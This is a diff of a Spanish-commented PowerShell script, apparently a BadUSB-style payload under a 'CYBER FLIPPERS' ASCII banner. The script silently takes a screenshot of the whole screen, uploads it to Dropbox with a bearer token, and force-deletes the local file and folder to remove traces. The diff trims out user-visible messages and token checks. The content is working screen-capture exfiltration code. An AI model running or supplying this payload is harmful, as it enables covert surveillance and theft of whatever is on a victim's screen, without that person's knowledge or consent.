@@ -5,17 +5,12 @@
 #  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                         # 
 #  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
 #   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                          # 
- #########################################################################################################################
+ #########################################################################################################################           
 
-# Recuperar el token de Dropbox desde la variable de entorno
-$db = $env:DROPBOX_TOKEN
+$folderName = "$env:temp\Screenshot_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss')"
+$filePath = "$folderName\screenshot.png"
 
-# Validar que el token no esté vacío
-if (-not $db) {
-    Write-Host "El token de Dropbox no está definido o no se ha pasado correctamente." -ForegroundColor Red
-    exit
-}
-
+# Función para subir un archivo a Dropbox
 function DropBox-Upload {
     param (
         [string]$SourceFilePath
@@ -24,42 +19,32 @@ function DropBox-Upload {
     $TargetFilePath = "/$outputFile"
     $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
     $authorization = "Bearer " + $db
-    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-    $headers.Add("Authorization", $authorization)
-    $headers.Add("Dropbox-API-Arg", $arg)
-    $headers.Add("Content-Type", 'application/octet-stream')
-
-    try {
-        $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-        Write-Host "Archivo subido a Dropbox: $response" -ForegroundColor Green
-    } catch {
-        Write-Host "Error al subir el archivo: $_" -ForegroundColor Red
+    $headers = @{
+        "Authorization" = $authorization
+        "Dropbox-API-Arg" = $arg
+        "Content-Type" = 'application/octet-stream'
     }
+    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-function Capture-Screenshot {
-    # Cargar System.Windows.Forms y tomar una captura de pantalla
-    Add-Type -AssemblyName System.Windows.Forms
-    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
-    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
+# Cargar System.Windows.Forms y tomar una captura de pantalla
+Add-Type -AssemblyName System.Windows.Forms
+$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
 
-    # Guardar la captura de pantalla en un archivo temporal
-    $filePath = "$env:temp\sc.png"
-    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
-    $graphics.Dispose()
-    $bitmap.Dispose()
-
-    return $filePath
-}
-
-# Capturar la pantalla y obtener la ruta del archivo
-$filePath = Capture-Screenshot
+# Guardar la captura de pantalla en un archivo
+New-Item -Path $folderName -ItemType Directory -Force | Out-Null
+$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
+$graphics.Dispose()
+$bitmap.Dispose()
 
 # Subir la captura de pantalla a Dropbox
-DropBox-Upload -SourceFilePath $filePath
+if (-not ([string]::IsNullOrEmpty($db))) {
+    DropBox-Upload -SourceFilePath $filePath
+}
 
-# Eliminar el archivo temporal
-Remove-Item -Path $filePath -ErrorAction SilentlyContinue
-
+# Eliminar el archivo y directorio temporal
+Remove-Item -Path $filePath -Force
+Remove-Item -Path $folderName -Recurse -Force
